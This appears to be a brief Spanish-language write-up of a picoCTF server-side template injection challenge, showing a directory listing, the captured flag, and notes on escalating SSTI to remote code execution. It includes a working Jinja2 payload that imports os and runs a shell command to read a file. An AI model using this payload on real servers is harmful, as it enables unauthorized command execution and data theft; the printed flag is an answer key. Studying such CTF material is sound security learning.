## Descripción

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:61967/)!
## Solución

**Solución 1
```
__pycache__ app.py flag requirements.txt

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
```

#### NOTAS
- **Concepto:** Remote Code Execution (RCE) vía SSTI.
- **Escalamiento:** Si las variables de entorno (`{{config}}`) no contienen la flag, se busca ejecutar comandos del sistema para explorar archivos.
- **Payload Útil:** `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`
- **Identificación:** Si `ls` muestra archivos sensibles, el servidor es vulnerable a una toma de control total del sistema de archivos.